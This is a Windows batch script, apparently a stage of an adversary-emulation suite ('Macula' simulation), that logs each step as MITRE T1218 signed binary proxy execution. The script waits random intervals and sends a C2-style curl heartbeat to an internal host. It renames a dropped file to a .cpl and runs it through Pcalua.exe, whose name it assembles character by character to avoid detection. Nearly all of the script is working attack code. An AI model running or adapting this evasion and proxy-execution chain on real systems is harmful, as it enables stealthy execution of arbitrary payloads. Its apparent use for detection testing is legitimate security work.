@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable assignments for PHR_ placeholders
SET yktnwwf=%APPDATA%\8480\d6580e42
SET fpakbq=Macula-Stage0-8480
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8480-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=msedges.txt
SET fpldhe=8480

REM Log file path
SET ksfjqn=%APPDATA%\!yydue!\macula-simulations.log

REM Initial long delay (30-60s)
SET /A rwvthx=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start=!rwvthx!s>> "!ksfjqn!" 2>nul
timeout /t !rwvthx! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_end>> "!ksfjqn!" 2>nul

REM C2 Heartbeat (non-obfuscated curl command)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!ksfjqn!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_end>> "!ksfjqn!" 2>nul

REM Short delay
SET /A aaqzpq=%RANDOM% %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay1_start=!aaqzpq!s>> "!ksfjqn!" 2>nul
ping -n !aaqzpq! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay1_end>> "!ksfjqn!" 2>nul

REM Obfuscate LOLBIN - Pcalua.exe character by character
SET v1=P
SET v2=c
SET v3=a
SET v4=l
SET v5=u
SET v6=a
SET v7=.
SET v8=e
SET v9=x
SET v10=e
SET kztfwj=!v1!!v2!!v3!!v4!!v5!!v6!!v7!!v8!!v9!!v10!

REM Obfuscate -a argument
SET q1=-
SET q2=a
SET q3=
SET rjfkdq=!q1!!q2!!q3!

REM Build directory path and rename file
SET outpath=!yktnwwf!
SET fname=!edjwtl!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_start=!outpath!\!fname!>> "!ksfjqn!" 2>nul
RENAME "!outpath!\!fname!" "pcafile.cpl"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_end=!outpath!\pcafile.cpl>> "!ksfjqn!" 2>nul

REM Check rename result for TTP logging
IF EXIST "!outpath!\pcafile.cpl" (
    SET gkdzny=1
    SET hjmdau=
) ELSE (
    SET gkdzny=0
    SET hjmdau=rename_failed
)

REM Format timestamp for TTP log
SET fwdate=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2!
SET fwtime=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!
echo [!fwdate! !fwtime!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!gkdzny!::!hjmdau!>> "!ksfjqn!" 2>nul

REM Random delay before execution
SET /A jhtxnh=%RANDOM% %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay2_start=!jhtxnh!s>> "!ksfjqn!" 2>nul
CHOICE /C Y /N /D Y /T !jhtxnh! >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay2_end>> "!ksfjqn!" 2>nul

REM Execute obfuscated Pcalua.exe with CPL
SET fullcmd="!outpath!\!kztfwj!" !rjfkdq! "!outpath!\pcafile.cpl"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start=!fullcmd!>> "!ksfjqn!" 2>nul
!fullcmd!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_end=!ERRORLEVEL!>> "!ksfjqn!" 2>nul

REM Execution TTP logging
IF !ERRORLEVEL! EQU 0 (
    SET oivjts=1
    SET lbrmqw=
) ELSE (
    SET oivjts=0
    SET lbrmqw=exitcode_!ERRORLEVEL!
)

SET fwdate2=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2!
SET fwtime2=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!
echo [!fwdate2! !fwtime2!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!oivjts!::!lbrmqw!>> "!ksfjqn!" 2>nul

REM Final random delay
SET /A zqkefl=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_start=!zqkefl!s>> "!ksfjqn!" 2>nul
timeout /t !zqkefl! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_end>> "!ksfjqn!" 2>nul

ENDLOCAL